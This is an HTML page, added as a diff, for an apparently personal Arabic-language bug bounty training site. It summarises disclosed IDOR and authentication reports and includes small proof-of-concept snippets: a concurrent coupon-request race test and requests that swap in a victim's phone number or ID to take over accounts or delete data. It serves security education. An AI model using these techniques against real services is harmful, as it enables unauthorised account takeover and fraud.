@@ -1,0 +1,1832 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Tawfik Soliman — Zero Track</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Tajawal:wght@300;400;500;700;800;900&family=Share+Tech+Mono&family=Rajdhani:wght@400;600;700&family=IBM+Plex+Mono:wght@400;600&family=Cairo:wght@400;600;700;900&family=Fira+Code&display=swap" rel="stylesheet">
+
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<!-- ═══ GLOBAL BOTTOM NAV ═══ -->
+<nav class="global-nav">
+  <button class="gn-btn on" onclick="showPage('home',this)">
+    <span class="gn-icon">🏠</span>
+    <span class="gn-label">الرئيسية</span>
+  </button>
+  <button class="gn-btn" onclick="showPage('encyclopedia',this)">
+    <span class="gn-icon">🗂️</span>
+    <span class="gn-label">الموسوعة</span>
+  </button>
+  <button class="gn-btn" onclick="showPage('bible',this)">
+    <span class="gn-icon">📖</span>
+    <span class="gn-label">Writeups</span>
+  </button>
+  <button class="gn-btn" onclick="showPage('trainer',this)">
+    <span class="gn-icon">🎯</span>
+    <span class="gn-label">التدريب</span>
+  </button>
+  <button class="gn-btn" onclick="showPage('reference',this)">
+    <span class="gn-icon">🌐</span>
+    <span class="gn-label">المرجع</span>
+  </button>
+</nav>
+
+<div class="content-wrap">
+
+<!-- ═══ HOME PAGE ═══ -->
+<div id="page-home" class="page active">
+<div class="cursor" id="cursor"></div>
+
+<!-- ═══ NAVBAR ═══ -->
+<nav class="navbar">
+  <a href="#" class="nav-logo">
+    <div class="logo-icon">🔐</div>
+    <div>
+      <div class="logo-text">ZERO TRACK</div>
+      <div class="logo-sub">Tawfik Soliman</div>
+    </div>
+  </a>
+  <div class="nav-links">
+    <a href="#" onclick="event.preventDefault();document.getElementById('page-home').querySelector('#tools').scrollIntoView({behavior:'smooth'})" class="nav-link active">الأدوات</a>
+    <a href="#" onclick="event.preventDefault();document.getElementById('page-home').querySelector('#about').scrollIntoView({behavior:'smooth'})" class="nav-link">عني</a>
+    <a href="#" onclick="event.preventDefault();document.getElementById('page-home').querySelector('#mobile').scrollIntoView({behavior:'smooth'})" class="nav-link">موبايل</a>
+  </div>
+  <div class="nav-status">
+    <div class="status-dot"></div>
+    ACTIVE
+  </div>
+</nav>
+
+<div class="page-wrap">
+
+  <!-- ═══ HERO ═══ -->
+  <section class="hero" id="home">
+    <div class="orb orb1"></div>
+    <div class="orb orb2"></div>
+
+    <div class="hero-eyebrow">BUG BOUNTY RESEARCHER</div>
+
+    <div class="hero-name">
+      TAWFIK<br>
+      <span>SOLIMAN</span>
+    </div>
+
+    <p class="hero-title">
+      <strong>Zero Track</strong> — منصة تدريب Bug Bounty احترافية.<br>
+      كل الأدوات والمراجع والـ Writeups في مكان واحد.
+    </p>
+
+    <div class="hero-badges">
+      <span class="hbadge hb-g">Bug Bounty Hunter</span>
+      <span class="hbadge hb-b">Web Pentester</span>
+      <span class="hbadge hb-r">Mobile Hacker</span>
+      <span class="hbadge hb-y">PortSwigger Labs</span>
+    </div>
+
+    <div class="hero-cta">
+      <a href="#" onclick="event.preventDefault();document.getElementById('page-home').querySelector('#tools').scrollIntoView({behavior:'smooth'})" class="btn-primary">🚀 ابدأ التدريب</a>
+      <a href="#" onclick="event.preventDefault();document.getElementById('page-home').querySelector('#about').scrollIntoView({behavior:'smooth'})" class="btn-ghost">⬇ اعرف أكتر</a>
+    </div>
+
+    <div class="hero-stats">
+      <div class="hstat">
+        <span class="hstat-n" style="color:var(--green)">50+</span>
+        <span class="hstat-l">Writeup حقيقي</span>
+      </div>
+      <div class="hstat">
+        <span class="hstat-n" style="color:var(--blue)">4</span>
+        <span class="hstat-l">مراجع متكاملة</span>
+      </div>
+      <div class="hstat">
+        <span class="hstat-n" style="color:var(--yellow)">45+</span>
+        <span class="hstat-l">Labs PortSwigger</span>
+      </div>
+    </div>
+
+    <div class="terminal-line">
+      <span class="prompt">tawfik@zero-track:~$</span>
+      <span class="cmd"> ./start_hunting.sh</span>
+      <span class="terminal-cursor"></span>
+    </div>
+  </section>
+
+  <!-- ═══ DIVIDER ═══ -->
+  <div class="divider"><div class="divider-text">// TOOLS & RESOURCES</div></div>
+
+  <!-- ═══ TOOLS ═══ -->
+  <section class="section" id="tools">
+
+    <div class="sec-label">الأدوات</div>
+    <div class="sec-title">مكتبة Zero Track</div>
+    <p class="sec-sub">4 مراجع احترافية شاملة — من الأساسيات للصيد الحقيقي</p>
+
+    <div class="tools-grid">
+
+      <!-- Tool 1: Encyclopedia -->
+      <a href="#" onclick="event.preventDefault();showPage('encyclopedia',document.querySelectorAll('.gn-btn')[1])" class="tool-card">
+        <div class="tool-card-inner">
+          <div class="tool-icon-wrap" style="background:rgba(0,255,136,.06);">🗂️</div>
+          <div class="tool-meta">
+            <div class="tool-num">01 // ENCYCLOPEDIA</div>
+            <div class="tool-name">موسوعة Writeups الكاملة</div>
+            <p class="tool-desc">
+              50+ writeup حقيقي موثوق من HackerOne وFacebook وGoogle وTwitter وUber وGitHub وTelegram — كل ثغرة بشرح كامل وأمثلة حقيقية وروابط مباشرة.
+            </p>
+            <div class="tool-tags">
+              <span class="ttag ttag-g">IDOR</span>
+              <span class="ttag ttag-r">XSS</span>
+              <span class="ttag ttag-b">SSRF</span>
+              <span class="ttag ttag-y">CSRF</span>
+              <span class="ttag ttag-p">API Security</span>
+              <span class="ttag ttag-g">Race Conditions</span>
+            </div>
+          </div>
+          <div class="tool-arrow">←</div>
+        </div>
+        <div class="tool-footer">
+          <span class="tf-left">50+ writeups · 9 نوع ثغرة · 15+ منصة</span>
+          <span class="tf-badge" style="background:rgba(0,255,136,.1);color:var(--green);border:1px solid rgba(0,255,136,.3);">FLAGSHIP</span>
+        </div>
+      </a>
+
+      <!-- Tool 2: Writeups Bible -->
+      <a href="#" onclick="event.preventDefault();showPage('bible',document.querySelectorAll('.gn-btn')[2])" class="tool-card">
+        <div class="tool-card-inner">
+          <div class="tool-icon-wrap" style="background:rgba(0,150,255,.06);">📖</div>
+          <div class="tool-meta">
+            <div class="tool-num">02 // WRITEUPS BIBLE</div>
+            <div class="tool-name">مرجع الـ Writeups</div>
+            <p class="tool-desc">
+              شرح تقني عميق لكل ثغرة مع writeups مختارة وتحليل مفصّل لكل خطوة — مناسب لفهم المنطق قبل الممارسة.
+            </p>
+            <div class="tool-tags">
+              <span class="ttag ttag-g">Deep Analysis</span>
+              <span class="ttag ttag-b">Step by Step</span>
+              <span class="ttag ttag-y">Real Exploits</span>
+              <span class="ttag ttag-r">PoC Examples</span>
+            </div>
+          </div>
+          <div class="tool-arrow">←</div>
+        </div>
+        <div class="tool-footer">
+          <span class="tf-left">تحليل معمّق · خطوات عملية · PoC حقيقي</span>
+          <span class="tf-badge" style="background:rgba(0,150,255,.1);color:var(--blue);border:1px solid rgba(0,150,255,.3);">REFERENCE</span>
+        </div>
+      </a>
+
+      <!-- Tool 3: Trainer -->
+      <a href="#" onclick="event.preventDefault();showPage('trainer',document.querySelectorAll('.gn-btn')[3])" class="tool-card">
+        <div class="tool-card-inner">
+          <div class="tool-icon-wrap" style="background:rgba(255,204,0,.06);">🎯</div>
+          <div class="tool-meta">
+            <div class="tool-num">03 // TRAINER</div>
+            <div class="tool-name">لوحة التدريب التفاعلية</div>
+            <p class="tool-desc">
+              تتبّع تقدمك في كل ثغرة، واكتشف ما تعلمته وما تحتاج تكمله — مع خارطة طريق واضحة وـ checklist تفاعلية.
+            </p>
+            <div class="tool-tags">
+              <span class="ttag ttag-g">Progress Tracker</span>
+              <span class="ttag ttag-y">Roadmap</span>
+              <span class="ttag ttag-b">Interactive</span>
+              <span class="ttag ttag-p">Hunt Checklist</span>
+            </div>
+          </div>
+          <div class="tool-arrow">←</div>
+        </div>
+        <div class="tool-footer">
+          <span class="tf-left">مسار تعلّم · checklist تفاعلي · تقرير Bug Bounty</span>
+          <span class="tf-badge" style="background:rgba(255,204,0,.1);color:var(--yellow);border:1px solid rgba(255,204,0,.3);">TRAINING</span>
+        </div>
+      </a>
+
+      <!-- Tool 4: Web Reference -->
+      <a href="#" onclick="event.preventDefault();showPage('reference',document.querySelectorAll('.gn-btn')[4])" class="tool-card">
+        <div class="tool-card-inner">
+          <div class="tool-icon-wrap" style="background:rgba(255,51,85,.06);">🌐</div>
+          <div class="tool-meta">
+            <div class="tool-num">04 // WEB REFERENCE</div>
+            <div class="tool-name">مرجع الويب للـ Pentester</div>
+            <p class="tool-desc">
+              مرجع سريع لـ HTML وCSS وJavaScript وHTTP وPHP وMySQL من منظور الـ Pentesting — كل الأساسيات اللي تحتاجها أثناء الصيد.
+            </p>
+            <div class="tool-tags">
+              <span class="ttag ttag-r">HTML</span>
+              <span class="ttag ttag-b">HTTP</span>
+              <span class="ttag ttag-y">JavaScript</span>
+              <span class="ttag ttag-g">PHP</span>
+              <span class="ttag ttag-p">MySQL</span>
+            </div>
+          </div>
+          <div class="tool-arrow">←</div>
+        </div>
+        <div class="tool-footer">
+          <span class="tf-left">6 لغات · Pentesting-focused · كود جاهز</span>
+          <span class="tf-badge" style="background:rgba(255,51,85,.1);color:var(--red);border:1px solid rgba(255,51,85,.3);">WEB DEV</span>
+        </div>
+      </a>
+
+    </div>
+  </section>
+
+  <!-- ═══ DIVIDER ═══ -->
+  <div class="divider"><div class="divider-text">// MOBILE SETUP</div></div>
+
+  <!-- ═══ MOBILE SECTION ═══ -->
+  <section class="section" id="mobile">
+    <div class="sec-label">إعداد الموبايل</div>
+    <div class="sec-title">Hack من موبايلك</div>
+    <p class="sec-sub">بدل Burp Suite — كل أدوات Bug Bounty في Kiwi Browser</p>
+
+    <div class="mobile-setup">
+      <div class="ms-title">📱 الأدوات الأساسية</div>
+      <div class="ms-item">
+        <div class="ms-icon">🌐</div>
+        <div>
+          <div class="ms-name">Kiwi Browser</div>
+          <div class="ms-desc">Chrome extensions على Android — المتصفح الأساسي</div>
+        </div>
+      </div>
+      <div class="ms-item">
+        <div class="ms-icon">🔧</div>
+        <div>
+          <div class="ms-name">Tamper Dev</div>
+          <div class="ms-desc">Intercept وتعديل HTTP requests — بديل Burp Suite</div>
+        </div>
+      </div>
+      <div class="ms-item">
+        <div class="ms-icon">⚡</div>
+        <div>
+          <div class="ms-name">HackBar</div>
+          <div class="ms-desc">إرسال custom requests سريع — XSS وSQLi testing</div>
+        </div>
+      </div>
+      <div class="ms-item">
+        <div class="ms-icon">🍪</div>
+        <div>
+          <div class="ms-name">Cookie Editor</div>
+          <div class="ms-desc">عرض وتعديل cookies — اختبار Privilege Escalation</div>
+        </div>
+      </div>
+      <div class="ms-item">
+        <div class="ms-icon">🔗</div>
+        <div>
+          <div class="ms-name">webhook.site</div>
+          <div class="ms-desc">Out-of-band testing — SSRF وBlind XSS</div>
+        </div>
+      </div>
+      <div class="ms-item">
+        <div class="ms-icon">🛠</div>
+        <div>
+          <div class="ms-name">DevTools</div>
+          <div class="ms-desc">Network · Sources · Console — مدمج في Kiwi</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="code-snip" style="margin-top:14px;">
+      <div class="cs-header">
+        <div class="cs-dots">
+          <div class="cs-dot" style="background:#ff5f57"></div>
+          <div class="cs-dot" style="background:#ffbd2e"></div>
+          <div class="cs-dot" style="background:#28ca41"></div>
+        </div>
+        <div class="cs-lang">DevTools Console — Race Condition Test</div>
+      </div>
+      <div class="cs-body">
+<span class="cs-c">// إرسال 20 request في نفس اللحظة</span>
+<span class="cs-k">const</span> reqs = [];
+<span class="cs-k">for</span>(<span class="cs-k">let</span> i = <span class="cs-v">0</span>; i < <span class="cs-v">20</span>; i++) {
+  reqs.push(<span class="cs-k">fetch</span>(<span class="cs-v">'/api/coupon/apply'</span>, {
+    method: <span class="cs-v">'POST'</span>,
+    body: JSON.stringify({code: <span class="cs-v">'SAVE50'</span>})
+  }));
+}
+<span class="cs-k">Promise</span>.all(reqs).then(r =>
+  console.log(<span class="cs-v">'Done:'</span>, r.length)
+);
+      </div>
+    </div>
+  </section>
+
+  <!-- ═══ DIVIDER ═══ -->
+  <div class="divider"><div class="divider-text">// ABOUT</div></div>
+
+  <!-- ═══ ABOUT ═══ -->
+  <section class="section" id="about">
+    <div class="sec-label">عني</div>
+    <div class="sec-title">Tawfik Soliman</div>
+    <p class="sec-sub">Zero Track — مسار التعلم من الصفر للاحتراف</p>
+
+    <div class="about-card">
+      <div class="about-header">
+        <div class="avatar">👨‍💻</div>
+        <div>
+          <div class="about-name">Tawfik Soliman</div>
+          <div class="about-handle">@zero_track</div>
+        </div>
+      </div>
+
+      <p class="about-text">
+        بتعلّم <strong>Bug Bounty</strong> من الموبايل — بدون Burp Suite وبدون لابتوب.<br>
+        بستخدم Kiwi Browser وTamper Dev كبديل احترافي للأدوات التقليدية.<br><br>
+        مسيرتي بدأت بـ <strong>Broken Access Control</strong> وـ IDOR — وهدفي
+        الوصول لأول مكافأة Bug Bounty حقيقية عبر منهجية ممنهجة ومراجع موثوقة.
+      </p>
+
+      <div class="skill-bars">
+        <div class="sbar-row">
+          <div class="sbar-name" style="font-size:11px;">Access Control</div>
+          <div class="sbar-track"><div class="sbar-fill" style="width:85%;background:linear-gradient(90deg,var(--green),#00ffaa)"></div></div>
+          <div class="sbar-pct" style="color:var(--green)">85%</div>
+        </div>
+        <div class="sbar-row">
+          <div class="sbar-name" style="font-size:11px;">Authentication</div>
+          <div class="sbar-track"><div class="sbar-fill" style="width:60%;background:linear-gradient(90deg,var(--yellow),#ffaa00)"></div></div>
+          <div class="sbar-pct" style="color:var(--yellow)">60%</div>
+        </div>
+        <div class="sbar-row">
+          <div class="sbar-name" style="font-size:11px;">Business Logic</div>
+          <div class="sbar-track"><div class="sbar-fill" style="width:50%;background:linear-gradient(90deg,var(--yellow),#ffaa00)"></div></div>
+          <div class="sbar-pct" style="color:var(--yellow)">50%</div>
+        </div>
+        <div class="sbar-row">
+          <div class="sbar-name" style="font-size:11px;">XSS / CSRF</div>
+          <div class="sbar-track"><div class="sbar-fill" style="width:15%;background:linear-gradient(90deg,var(--red),#ff6688)"></div></div>
+          <div class="sbar-pct" style="color:var(--red)">15%</div>
+        </div>
+        <div class="sbar-row">
+          <div class="sbar-name" style="font-size:11px;">SSRF / API</div>
+          <div class="sbar-track"><div class="sbar-fill" style="width:10%;background:linear-gradient(90deg,var(--red),#ff6688)"></div></div>
+          <div class="sbar-pct" style="color:var(--red)">10%</div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ═══ FOOTER ═══ -->
+  <footer class="footer">
+    <div class="footer-logo">ZERO <span>TRACK</span></div>
+    <div class="footer-sub">Tawfik Soliman — Bug Bounty Researcher</div>
+
+    <div class="footer-links">
+      <a href="#" onclick="event.preventDefault();showPage('encyclopedia',document.querySelectorAll('.gn-btn')[1])" class="footer-link">🗂 الموسوعة</a>
+      <a href="#" onclick="event.preventDefault();showPage('bible',document.querySelectorAll('.gn-btn')[2])" class="footer-link">📖 الـ Writeups</a>
+      <a href="#" onclick="event.preventDefault();showPage('trainer',document.querySelectorAll('.gn-btn')[3])" class="footer-link">🎯 التدريب</a>
+      <a href="#" onclick="event.preventDefault();showPage('reference',document.querySelectorAll('.gn-btn')[4])" class="footer-link">🌐 المرجع</a>
+    </div>
+
+    <div class="footer-copy">
+      © 2025 <span>Zero Track</span> · Tawfik Soliman · All Rights Reserved
+    </div>
+  </footer>
+
+</div><!-- end page-wrap -->
+
+
+</div>
+
+<!-- ═══ ENCYCLOPEDIA PAGE ═══ -->
+<div id="page-encyclopedia" class="page">
+<!-- TOPBAR -->
+<div class="topbar">
+  <div class="tb-logo">$ bug_bounty --writeups --all</div>
+  <div class="tb-right">
+    <span class="tb-pill tp-grn">✓ VERIFIED</span>
+    <span class="tb-pill tp-red">REAL REPORTS</span>
+    <span class="tb-pill tp-blu">ALL PLATFORMS</span>
+  </div>
+</div>
+
+<!-- HERO -->
+<div class="hero">
+  <div class="hero-tag">ULTIMATE ENCYCLOPEDIA v3.0</div>
+  <h1>موسوعة <span class="hl">Writeups</span><br>Bug Bounty الكاملة</h1>
+  <p class="hero-desc">
+    كل writeup موثوق من مصدره الأصلي · HackerOne · Bugcrowd · Facebook · Twitter · GitHub · Telegram · Google · كل ثغرة + tricks + labs + روابط مباشرة
+  </p>
+  <div class="counters">
+    <div class="cnt"><span class="cnt-n" style="color:var(--grn)">50+</span><span class="cnt-l">Writeup حقيقي</span></div>
+    <div class="cnt"><span class="cnt-n" style="color:var(--acc)">9</span><span class="cnt-l">نوع ثغرة</span></div>
+    <div class="cnt"><span class="cnt-n" style="color:var(--org)">45+</span><span class="cnt-l">Lab مرجعي</span></div>
+    <div class="cnt"><span class="cnt-n" style="color:var(--pur)">15+</span><span class="cnt-l">منصة مصدر</span></div>
+  </div>
+</div>
+
+<!-- NAV -->
+<div class="nav">
+  <button class="navbtn on" onclick="go('idor')">🔑 IDOR</button>
+  <button class="navbtn" onclick="go('auth')">🔐 Auth</button>
+  <button class="navbtn" onclick="go('logic')">💰 Business</button>
+  <button class="navbtn" onclick="go('xss')">⚡ XSS</button>
+  <button class="navbtn" onclick="go('csrf')">🔄 CSRF</button>
+  <button class="navbtn" onclick="go('ssrf')">🌐 SSRF</button>
+  <button class="navbtn" onclick="go('race')">⏱ Race</button>
+  <button class="navbtn" onclick="go('upload')">📁 Upload</button>
+  <button class="navbtn" onclick="go('api')">🔌 API</button>
+  <button class="navbtn" onclick="go('tricks')">🎩 Tricks</button>
+  <button class="navbtn" onclick="go('sources')">📚 Sources</button>
+  <button class="navbtn" onclick="go('roadmap')">🗺 Roadmap</button>
+</div>
+
+<!-- ════════════════════════════════════════════════════
+     IDOR
+════════════════════════════════════════════════════ -->
+<div id="p-idor" class="panel on">
+<div class="sh">
+  <div class="sh-icon">🔑</div>
+  <div><div class="sh-title">IDOR / Broken Access Control</div><div class="sh-sub">أتقنتها ✅ — 15+ writeup حقيقي من كل المنصات</div></div>
+</div>
+
+<!-- Uber #143717 -->
+<div class="wcard op" onclick="tog(this)">
+  <div class="wcard-h">
+    <div class="wlogo" style="background:rgba(248,81,73,.1);color:#ff7b72;">UBER<br>#143717</div>
+    <div class="wmeta">
+      <div class="wtitle">Change any Uber user's password via /rt/users/passwordless-signup</div>
+      <div class="wsub">
+        <span class="badge bc">💰 $10,000</span>
+        <span class="badge br">CRITICAL — ATO</span>
+        <span class="badge bd">277 upvotes</span>
+        <span class="badge bd">HackerOne</span>
+      </div>
+    </div>
+    <div class="warr">▼</div>
+  </div>
+  <div class="wbody">
+    <div class="blk">
+      <div class="blk-title bt-y">ملخص الثغرة</div>
+      <div class="blk-txt">
+        الباحث <strong>mongo (Mongobug)</strong> اكتشف إن الـ endpoint <code>/rt/users/passwordless-signup</code> في Uber يقبل رقم هاتف أي مستخدم ويسمح بتغيير كلمة مروره — بدون أي تحقق من الـ session أو الـ ownership. بمجرد معرفة رقم هاتف الضحية (سهل الحصول عليه)، يمكن الاستيلاء على حسابه كاملاً.
+      </div>
+    </div>
+    <div class="blk">
+      <div class="blk-title bt-r">خطوات الاستغلال</div>
+      <ol class="steps">
+        <li>سجّل حساب Uber وافتح DevTools Network</li>
+        <li>ابحث عن endpoint يستخدم phone number كـ identifier</li>
+        <li>في Tamper Dev، غيّر phone_number بـ رقم ضحية أخرى</li>
+        <li>أرسل الـ request — الـ server قبل تغيير الـ password!</li>
+        <li>IDOR مش بس بـ id رقمي — أي identifier فريد يصلح</li>
+      </ol>
+      <div class="code">
+<span class="c"># Original Request</span>
+<span class="k">POST</span> /rt/users/passwordless-signup
+<span class="v">{"phoneNumber": "+1YOUR_PHONE", "newPassword": "test123"}</span>
+
+<span class="c"># IDOR — رقم هاتف الضحية</span>
+<span class="d">{"phoneNumber": "+1VICTIM_PHONE", "newPassword": "hacked123"}</span>
+<span class="c">← Server accepted = Account Takeover!</span>
+      </div>
+    </div>
+    <div class="blk">
+      <div class="blk-title bt-g">الدرس الأهم</div>
+      <div class="note ng">💡 الـ IDOR مش بس id=1,2,3 — email, phone, username, account_number كلها تصلح كـ IDOR identifier. جرّبها كلها.</div>
+    </div>
+    <div class="blk">
+      <div class="blk-title bt-b">المصادر</div>
+      <div class="links">
+        <a href="https://hackerone.com/reports/143717" target="_blank" class="lnk">🔗 HackerOne Report #143717 — الأصلي <span class="lnk-badge">DISCLOSED</span></a>
+        <a href="https://github.com/marz-hunter/Hackerone-Report/blob/master/tops_by_program/TOPUBER.md" target="_blank" class="lnk">📋 Top Uber Reports — GitHub <span class="lnk-badge">VERIFIED</span></a>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Reddit IDOR -->
+<div class="wcard" onclick="tog(this)">
+  <div class="wcard-h">
+    <div class="wlogo" style="background:rgba(255,102,0,.1);color:#ff6600;">RED<br>DIT</div>
+    <div class="wmeta">
+      <div class="wtitle">IDOR — Access mod logs from any public or restricted subreddit</div>
+      <div class="wsub">
+        <span class="badge bc">💰 $5,000</span>
+        <span class="badge by">HIGH</span>
+        <span class="badge bd">150 upvotes · HackerOne</span>
+      </div>
+    </div>
+    <div class="warr">▼</div>
+  </div>
+  <div class="wbody">
+    <div class="blk">
+      <div class="blk-title bt-y">التفاصيل</div>
+      <div class="blk-txt">تغيير الـ subreddit ID في الـ API request أتاح الوصول لـ mod logs لأي subreddit — حتى المقيّدة (restricted). الـ mod logs تحتوي بيانات حساسة عن المشرفين والإجراءات.</div>
+    </div>
+    <div class="blk">
+      <div class="blk-title bt-g">الدرس</div>
+      <div class="blk-txt">في <strong>Community platforms</strong> (Reddit, Discord, Slack)، ابحث عن endpoints تستخدم community_id أو workspace_id أو channel_id — كلها تصلح لـ IDOR.</div>
+    </div>
+  </div>
+</div>
+
+<!-- HackerOne IDOR on itself -->
+<div class="wcard" onclick="tog(this)">
+  <div class="wcard-h">
+    <div class="wlogo" style="background:rgba(248,81,73,.1);color:#ff7b72;">H1<br>SELF</div>
+    <div class="wmeta">
+      <div class="wtitle">IDOR — Delete any HackerOne Certifications via GraphQL</div>
+      <div class="wsub">
+        <span class="badge bc">💰 $12,500</span>
+        <span class="badge br">CRITICAL</span>
+        <span class="badge bd">372 upvotes — #1 IDOR</span>
+      </div>
+    </div>
+    <div class="warr">▼</div>
+  </div>
+  <div class="wbody">
+    <div class="blk">
+      <div class="blk-title bt-y">القصة</div>
+      <div class="blk-txt">
+        الـ GraphQL mutation <code>CreateOrUpdateHackerCertification</code> لم تتحقق من الـ ownership. بتغيير الـ hacker_id في الـ mutation، أي شخص يمكنه حذف شهادات أي باحث آخر في HackerOne.
+      </div>
+      <div class="code">
+<span class="c"># GraphQL IDOR Mutation</span>
+<span class="k">mutation</span> {
+  <span class="v">CreateOrUpdateHackerCertification</span>(<span class="k">input</span>: {
+    <span class="d">hacker_id: VICTIM_ID,</span>  <span class="c">← تغيير هذا</span>
+    <span class="v">certification_id: 1,</span>
+    <span class="v">action: "DELETE"</span>
+  })
+}
+      </div>
+    </div>
+    <div class="blk">
+      <div class="blk-title bt-r">GraphQL IDOR — كيف تختبر</div>
+      <ol class="steps">
+        <li>في DevTools، ابحث عن requests لـ /graphql</li>
+        <li>الـ mutations تحتوي على IDs في الـ input — غيّرها</li>
+        <li>جرّب كل mutation تجدها: create, update, delete</li>
+        <li>GraphQL غالباً كمية كبيرة من الـ actions في endpoint واحد</li>
+      </ol>
+    </div>
+  </div>
+</div>
+
+<!-- Starbucks ATO via IDOR -->
+<div class="wcard" onclick="tog(this)">
+  <div class="wcard-h">
+    <div class="wlogo" style="background:rgba(0,112,74,.1);color:#3fb950;">STAR<br>BUCKS</div>
+    <div class="wmeta">
+      <div class="wtitle">Singapore — Account Takeover via IDOR (3-digit account ID)</div>
+      <div class="wsub">
+        <span class="badge br">CRITICAL — ATO</span>
+        <span class="badge bd">255 upvotes · HackerOne</span>
+      </div>
+    </div>
+    <div class="warr">▼</div>
+  </div>
+  <div class="wbody">
+    <div class="blk">
+      <div class="blk-title bt-y">لماذا هذا مهم جداً</div>
+      <div class="blk-txt">
+        الـ account_id كان 3 أرقام فقط (1000 احتمال). مع email الضحية المُسرَّب في مكان آخر + IDOR + ID قصير = Account Takeover كامل.
+      </div>
+      <div class="note nr">⚡ IDs قصيرة = خطر مضاعف. رقم مكون من 3-6 أرقام يمكن brute force بسهولة. سجّل كل IDOR بـ ID قصير كـ Critical.</div>
+    </div>
+  </div>
+</div>
+
+<!-- TikTok IDOR ads -->
+<div class="wcard" onclick="tog(this)">
+  <div class="wcard-h">
+    <div class="wlogo" style="background:rgba(0,200,200,.1);color:#79c0ff;">TIK<br>TOK</div>
+    <div class="wmeta">
+      <div class="wtitle">IDOR on ads.tiktok.com — Unauthorized Product Addition</div>
+      <div class="wsub">
+        <span class="badge bc">💰 $500</span>
+        <span class="badge by">HIGH</span>
+        <span class="badge bd">120 upvotes · HackerOne</span>
+      </div>
+    </div>
+    <div class="warr">▼</div>
+  </div>
+  <div class="wbody">
+    <div class="blk">
+      <div class="blk-title bt-y">التفاصيل</div>
+      <div class="blk-txt">في TikTok Ads Manager، تغيير advertiser_id في POST request لإضافة منتج أتاح إضافة منتجات لحسابات إعلانية لا تملكها. هذا يمثل تعارض تجاري خطير.</div>
+    </div>
+    <div class="blk">
+      <div class="blk-title bt-r">IDOR في Ads Platforms</div>
+      <div class="blk-txt">
+        في Facebook Ads, TikTok Ads, Google Ads — ابحث عن: <code>advertiser_id</code>, <code>campaign_id</code>, <code>account_id</code>, <code>pixel_id</code>. هذه كلها حساسة وغالباً لا تُختبر جيداً.
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Google Sites IDOR -->
+<div class="wcard" onclick="tog(this)">
+  <div class="wcard-h">
+    <div class="wlogo" style="background:rgba(66,133,244,.1);color:#79c0ff;">GOOG<br>VRP</div>
+    <div class="wmeta">
+      <div class="wtitle">$7,500 Google Sites IDOR — by r0ckin</div>
+      <div class="wsub">
+        <span class="badge bc">💰 $7,500</span>
+        <span class="badge by">HIGH</span>
+        <span class="badge bd">Google VRP — VERIFIED</span>
+      </div>
+    </div>
+    <div class="warr">▼</div>
+  </div>
+  <div class="wbody">
+    <div class="blk">
+      <div class="blk-title bt-y">الدرس</div>
+      <div class="blk-txt">حتى Google تحتوي على IDOR. الـ site_id في Google Sites API لم يُتحقق منه بشكل صحيح مما أتاح تعديل مواقع مستخدمين آخرين.</div>
+      <div class="note ng">✅ Google VRP = أحد أفضل البرامج للمحترفين. مبتدئ؟ ابدأ ببرامج أصغر أولاً.</div>
+    </div>
+  </div>
+</div>
+
+<!-- Labs -->
+<div class="blk" style="background:var(--s2);border:1px solid var(--b);border-radius:8px;margin-bottom:10px;">
+  <div class="blk-title bt-g" style="margin-bottom:10px;">🧪 Labs PortSwigger — IDOR & Access Control</div>
+  <a href="https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter" target="_blank" class="lab">🧪 IDOR via request parameter <span class="lab-d la">Apprentice</span></a>
+  <a href="https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-unpredictable-user-ids" target="_blank" class="lab">🧪 IDOR with unpredictable GUIDs <span class="lab-d lp">Practitioner</span></a>
+  <a href="https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-data-leakage-in-redirect" target="_blank" class="lab">🧪 IDOR with data leakage in redirect <span class="lab-d lp">Practitioner</span></a>
+  <a href="https://portswigger.net/web-security/access-control/lab-unprotected-admin-functionality" target="_blank" class="lab">🧪 Unprotected admin functionality <span class="lab-d la">Apprentice</span></a>
+  <a href="https://portswigger.net/web-security/access-control/lab-method-based-access-control-can-be-circumvented" target="_blank" class="lab">🧪 Method-based bypass <span class="lab-d lp">Practitioner</span></a>
+  <a href="https://portswigger.net/web-security/access-control/lab-multi-step-process-with-no-access-control-on-one-step" target="_blank" class="lab">🧪 Multi-step bypass <span class="lab-d lp">Practitioner</span></a>
+</div>
+
+<!-- Sources -->
+<div class="links">
+  <a href="https://github.com/reddelexc/hackerone-reports/blob/master/tops_by_bug_type/TOPIDOR.md" target="_blank" class="lnk">📋 Top 200+ IDOR Reports — GitHub reddelexc <span class="lnk-badge">ESSENTIAL</span></a>
+  <a href="https://www.hackerone.com/blog/how-idor-vulnerability-led-user-profile-modification" target="_blank" class="lnk">📝 HackerOne Blog — IDOR Deep Dive <span class="lnk-badge">OFFICIAL</span></a>
+  <a href="https://www.bugbountyhunter.com/vulnerability/?type=idor" target="_blank" class="lnk">🎯 BugBountyHunter — IDOR Guide + Methodology</a>
+  <a href="https://portswigger.net/web-security/access-control" target="_blank" class="lnk">🟢 PortSwigger Access Control Academy</a>
+  <a href="https://pentester.land/writeups/" target="_blank" class="lnk">🌍 Pentester.land — Writeups Directory (الأضخم)</a>
+</div>
+</div>
+
+<!-- ════════════════════════════════════════════════════
+     AUTH
+════════════════════════════════════════════════════ -->
+<div id="p-auth" class="panel">
+<div class="sh">
+  <div class="sh-icon">🔐</div>
+  <div><div class="sh-title">Authentication Vulnerabilities</div><div class="sh-sub">Facebook · Instagram · HackerOne · Real Bypasses</div></div>
+</div>
+
+<!-- Facebook 2FA enumeration -->
+<div class="wcard op" onclick="tog(this)">
+  <div class="wcard-h">
+    <div class="wlogo" style="background:rgba(24,119,242,.1);color:#79c0ff;">META<br>BB</div>
+    <div class="wmeta">
+      <div class="wtitle">Facebook BB: Enumerate Instagram accounts with 2FA enabled</div>
+      <div class="wsub"><span class="badge bc">💰 PAID</span><span class="badge bd">Facebook Bug Bounty — VERIFIED</span></div>
+    </div>
+    <div class="warr">▼</div>
+  </div>
